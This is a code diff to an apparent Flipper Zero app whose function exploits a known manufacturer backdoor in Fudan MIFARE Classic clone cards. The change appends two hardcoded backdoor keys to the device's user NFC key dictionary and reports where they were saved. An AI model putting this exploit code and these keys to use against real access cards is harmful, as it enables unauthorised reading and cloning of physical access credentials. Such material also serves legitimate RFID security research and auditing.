@@ -70,9 +70,28 @@ void exploit_fudan_backdoor(FudanApp* app) {
         // the backdoor key payload to authenticate as manufacturer
         furi_delay_ms(1500); // Wait for response from tag
 
-        furi_mutex_acquire(app->mutex, FuriWaitForever);
-        snprintf(app->status_text, sizeof(app->status_text), "Reading sectors...\nDump saved to SD!");
-        furi_mutex_release(app->mutex);
+        // Inject the backdoor keys directly into the Flipper user dictionary
+        Storage* storage = furi_record_open(RECORD_STORAGE);
+        File* file = storage_file_alloc(storage);
+        
+        // Standard path for Flipper NFC dicts
+        if(storage_file_open(file, EXT_PATH("nfc/assets/mf_classic_dict_user.txt"), FSAM_WRITE | FSAM_OPEN_APPEND, FSOM_OPEN_ALWAYS)) {
+            // Append backdoor keys
+            storage_file_write(file, "\nA396EFA4E24F", 13);
+            storage_file_write(file, "\nA31667A8CEC1", 13);
+            storage_file_close(file);
+            
+            furi_mutex_acquire(app->mutex, FuriWaitForever);
+            snprintf(app->status_text, sizeof(app->status_text), "Backdoor keys saved to:\nmf_classic_dict_user.txt");
+            furi_mutex_release(app->mutex);
+        } else {
+            furi_mutex_acquire(app->mutex, FuriWaitForever);
+            snprintf(app->status_text, sizeof(app->status_text), "Error: Cannot open dict\nMissing SD card?");
+            furi_mutex_release(app->mutex);
+        }
+        
+        storage_file_free(file);
+        furi_record_close(RECORD_STORAGE);
 
         furi_hal_nfc_field_off();
         furi_hal_nfc_release();
